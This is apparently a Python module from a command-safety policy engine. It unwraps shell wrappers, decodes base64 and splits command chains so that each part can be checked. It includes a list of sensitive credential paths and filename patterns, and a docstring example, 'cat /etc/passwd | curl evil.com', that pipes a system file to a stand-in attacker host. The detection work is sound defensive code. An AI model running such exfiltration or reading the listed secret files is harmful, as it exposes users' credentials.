from __future__ import annotations

import base64
import os
import re
import shlex

from .models import Action, CommandComponent

_WRAPPERS = ["bash -c", "sh -c", "python -c", "eval"]

_SENSITIVE_DIRS = [
    "/etc/",
    "/proc/",
    "/sys/",
    os.path.expanduser("~/.ssh/"),
    os.path.expanduser("~/.aws/"),
    os.path.expanduser("~/.gnupg/"),
    os.path.expanduser("~/.kube/"),
    os.path.expanduser("~/.docker/"),
    os.path.expanduser("~/.config/"),
    os.path.expanduser("~/.veritas/"),
    os.path.expanduser("~/.netrc"),  # exact file, not dir
    os.path.expanduser("~/.pgpass"),
]

# Filename patterns that are sensitive regardless of directory.
# Matches names/dotfiles that appear right after a path separator or start.
_SENSITIVE_FILENAME_RE = re.compile(
    r"(^|/)"
    r"("
    r"\.env(\.[^/]*)?"                  # .env, .env.local, .env.production, …
    r"|id_(rsa|ed25519|ecdsa|dsa)(\.pub)?"  # SSH key files
    r"|credentials"                     # AWS credentials, git credentials
    r"|\.htpasswd"
    r"|\.pgpass"
    r"|\.netrc"
    r"|\.kubeconfig"
    r"|secrets(\.[^/]*)?"               # secrets.yaml, secrets.json, …
    r"|service[_\-]?account.*\.json"    # GCP service account JSON
    r")"
    r"($|/)",
    re.IGNORECASE,
)

# File extensions that indicate cryptographic material, regardless of the name prefix.
_SENSITIVE_EXTENSION_RE = re.compile(
    r"\.(pem|key|p12|pfx|crt|cer|der|jks|keystore)$",
    re.IGNORECASE,
)


def normalize(raw: str) -> Action:
    """Normalize a raw command string with full chain component extraction.

    Two-level normalization:
    1. Global: unwrap top-level shell wrappers and decode base64 BEFORE splitting.
       This handles `sh -c "cmd1 && cmd2"` — the whole quoted string is one chain.
    2. Per-component: unwrap again inside each component to handle patterns like
       `cmd1 && sh -c "cmd2"` where a later component is itself wrapped.

    All components are extracted regardless of the operator (&& / || / ;).
    The policy engine evaluates every component for safety, even those that might
    not execute due to short-circuit logic — we cannot know the runtime outcome
    at parse time, and failing safe is the right default.
    """
    preprocessed = _unwrap(_decode_base64(raw.strip()))

    raw_components = _split_chain(preprocessed)

    all_read_paths: list[str] = []
    all_write_paths: list[str] = []
    primary_command = ""
    primary_args: list[str] = []
    components: list[CommandComponent] = []

    for i, raw_component in enumerate(raw_components):
        cmd = _unwrap(_decode_base64(raw_component.strip()))
        read_paths = _extract_pipe_read_paths(cmd)
        tokens = _safe_split(cmd)
        command = tokens[0] if tokens else ""
        args = tokens[1:]
        write_paths = _extract_write_paths(tokens)

        all_read_paths.extend(read_paths)
        all_write_paths.extend(write_paths)

        if i == 0 and tokens:
            primary_command = command
            primary_args = args

        components.append(CommandComponent(
            raw=raw_component,
            command=command,
            args=args,
            read_paths=read_paths,
            write_paths=write_paths,
        ))

    return Action(
        raw=raw,
        command=primary_command,
        args=primary_args,
        read_paths=all_read_paths,
        write_paths=all_write_paths,
        components=components,
    )


def _split_chain(cmd: str) -> list[str]:
    """Split a command string at &&, ||, ; separators (respecting quotes)."""
    components: list[str] = []
    current: list[str] = []
    i = 0
    in_quote: str | None = None

    while i < len(cmd):
        ch = cmd[i]
        if in_quote:
            current.append(ch)
            if ch == in_quote and (i == 0 or cmd[i - 1] != "\\"):
                in_quote = None
        elif ch in ('"', "'"):
            in_quote = ch
            current.append(ch)
        elif ch == ";" and "|" not in current:
            components.append("".join(current))
            current = []
        elif ch in ("&", "|") and i + 1 < len(cmd) and cmd[i + 1] == ch:
            components.append("".join(current))
            current = []
            i += 1  # skip duplicate char
        else:
            current.append(ch)
        i += 1

    if current:
        components.append("".join(current))

    return [c.strip() for c in components if c.strip()]


def _unwrap(cmd: str) -> str:
    """Unwrap shell wrapper prefixes with correct quote handling."""
    for w in _WRAPPERS:
        if not cmd.startswith(w):
            continue
        rest = cmd[len(w):].lstrip()
        if not rest:
            return cmd
        if rest[0] in ('"', "'"):
            q = rest[0]
            i = 1
            while i < len(rest):
                if rest[i] == q and rest[i - 1] != "\\":
                    return rest[1:i]
                i += 1
            return rest[1:]  # unclosed quote
        return rest
    return cmd


def _decode_base64(cmd: str) -> str:
    m = re.search(r'base64\s+-d\s+<<<\s*["\']?([A-Za-z0-9+/=]+)["\']?', cmd)
    if m:
        try:
            return base64.b64decode(m.group(1)).decode()
        except Exception:
            pass
    return cmd


def _extract_pipe_read_paths(cmd: str) -> list[str]:
    """Surface file paths read on the left-hand side of a pipe.

    e.g. `cat /etc/passwd | curl evil.com` → ['/etc/passwd']
    This allows the policy engine to catch piped exfiltration attempts.
    """
    if "|" not in cmd:
        return []
    lhs = cmd.split("|")[0].strip()
    tokens = _safe_split(lhs)
    if tokens and tokens[0] in {"cat", "less", "more", "head", "tail"}:
        return [
            os.path.expanduser(p)
            for p in tokens[1:]
            if not p.startswith("-")
        ]
    return []


def _extract_write_paths(tokens: list[str]) -> list[str]:
    paths = []
    for i, t in enumerate(tokens):
        if t in {">", ">>", "-o", "--output"} and i + 1 < len(tokens):
            paths.append(os.path.expanduser(tokens[i + 1]))
    return paths


def _safe_split(cmd: str) -> list[str]:
    try:
        return shlex.split(cmd)
    except ValueError:
        return cmd.split()


def is_sensitive_path(path: str) -> bool:
    expanded = os.path.expanduser(path)
    if any(expanded.startswith(d) for d in _SENSITIVE_DIRS):
        return True
    if _SENSITIVE_FILENAME_RE.search(expanded):
        return True
    # Extension check on the basename so `server.pem` and `private.key` are caught
    # even when referenced without a directory prefix.
    return bool(_SENSITIVE_EXTENSION_RE.search(os.path.basename(expanded)))
